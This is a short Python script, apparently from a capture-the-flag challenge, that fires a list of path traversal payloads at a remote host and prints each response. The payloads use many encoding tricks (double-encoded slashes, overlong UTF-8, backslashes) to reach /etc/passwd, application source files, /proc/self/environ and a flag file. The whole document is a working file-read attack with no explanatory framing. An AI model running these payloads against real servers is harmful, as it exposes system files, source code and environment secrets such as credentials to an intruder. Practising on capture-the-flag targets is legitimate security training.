import requests

base = "https://rsnfg2lzhxprnrolji5kuaicz3e.cloud.d3c.tf"

traversals = [
    "..%2f..%2f..%2fetc%2fpasswd",
    "..%252f..%252f..%252fetc%252fpasswd",
    "..%c0%af..%c0%af..%c0%afetc%c0%afpasswd",
    "..%e0%80%af..%e0%80%af..%e0%80%afetc%e0%80%afpasswd",
    "..%5c..%5c..%5cetc%5cpasswd",
    "..%255c..%255c..%255cetc%255cpasswd",
    "....//....//....//etc/passwd",
    "....%2f%2f....%2f%2f....%2f%2fetc%2fpasswd",
    "..%2f..%2f..%2fapp%2findex.js",
    "..%2f..%2f..%2fapp%2fpackage.json",
    "..%2f..%2f..%2fapp%2fserver.js",
    "..%2f..%2f..%2fapp%2fapp.js",
    "..%2f..%2f..%2fflag",
    "..%2f..%2f..%2fflag.txt",
    "..%2f..%2f..%2fproc%2fself%2fcmdline",
    "..%2f..%2f..%2fproc%2fself%2fenviron",
    "..%2f",
    "../",
    ".",
    "flag",
    "flag.txt",
]

for t in traversals:
    url = f"{base}/test/7f9c18a2e44d/{t}"
    r = requests.get(url)
    print(f"{t:50s} -> {r.status_code} ({len(r.content)}B) : {repr(r.content[:60])}")
